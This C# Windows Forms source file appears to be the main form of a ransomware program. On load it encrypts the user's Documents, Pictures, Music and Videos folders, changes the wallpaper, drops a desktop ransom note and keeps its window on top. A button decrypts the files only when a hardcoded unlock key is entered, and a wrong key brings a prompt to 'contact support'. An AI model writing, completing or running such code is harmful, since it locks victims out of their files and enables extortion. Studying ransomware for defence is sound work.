using System.Buffers.Text;
using System;
using System.Text;
using Windows;
using System.IO;


namespace WinFormsApp1
{

    public partial class Form1 : Form
    {
        //public string folderPath = @"F:\pastolektor\TEST";
        public string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        public string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        public string picturesPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
        public string musicPath = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
        public string videosPath = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
        public Form1()
        {
            InitializeComponent();
        }



        private void Form1_Load(object sender, EventArgs e)
        {
            button3.Hide();
            button4.Hide();
         
            //WinFormsApp1.EncyrptDecrypt.EncryptFolder(folderPath);

           // WinFormsApp1.EncyrptDecrypt.EncryptFolder(desktopPath);
            WinFormsApp1.EncyrptDecrypt.EncryptFolder(documentsPath);
            WinFormsApp1.EncyrptDecrypt.EncryptFolder(picturesPath);
            WinFormsApp1.EncyrptDecrypt.EncryptFolder(musicPath);
            WinFormsApp1.EncyrptDecrypt.EncryptFolder(videosPath);


            BGchanger.bgchange();
            DesktopNote.dropDesktopNote();
            WindowState = FormWindowState.Normal;
            ShowInTaskbar = false;
            TopMost = true;


            // Encrypt files in the folder
            //FileEncryption.EncryptFolder(folderPath);

            // Decrypt files in the folder
            //FileEncryption.DecryptFolder(folderPath);



        }


        private void button1_Click(object sender, EventArgs e)
        {
            var keyBytes = Encoding.UTF8.GetBytes("zaq1@WSX");
            var unlockKey = Convert.ToBase64String(keyBytes);
            var base64UnlockKey = Convert.FromBase64String(unlockKey);


            if (textBox1.Text == Encoding.UTF8.GetString(base64UnlockKey))
            {
                MessageBox.Show("Verification succesful, unlocking your PC ;)");
                // WinFormsApp1.EncyrptDecrypt.DecryptFolder(folderPath);
               // WinFormsApp1.EncyrptDecrypt.DecryptFolder(desktopPath);
                Thread.Sleep(1000);
                WinFormsApp1.EncyrptDecrypt.DecryptFolder(documentsPath);
                Thread.Sleep(1000);
                WinFormsApp1.EncyrptDecrypt.DecryptFolder(picturesPath);
                Thread.Sleep(1000);
                WinFormsApp1.EncyrptDecrypt.DecryptFolder(musicPath);
                Thread.Sleep(1000);
                WinFormsApp1.EncyrptDecrypt.DecryptFolder(videosPath);
                Thread.Sleep(7000);
                BGchanger.bgchangeBack();
                button3.Show();
                button4.Show();
                MessageBox.Show("In case some files remained encrypted use manual decryptor");
            }
            else
            {
                MessageBox.Show("Provided key is not correct. Enter it once again or contact support");
            }
        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            DesktopNote.dropDesktopNote();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            System.Windows.Forms.Application.Exit();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            Form2 form2 = new Form2();
            TopMost = false;
            form2.ShowDialog();
        }
    }
}
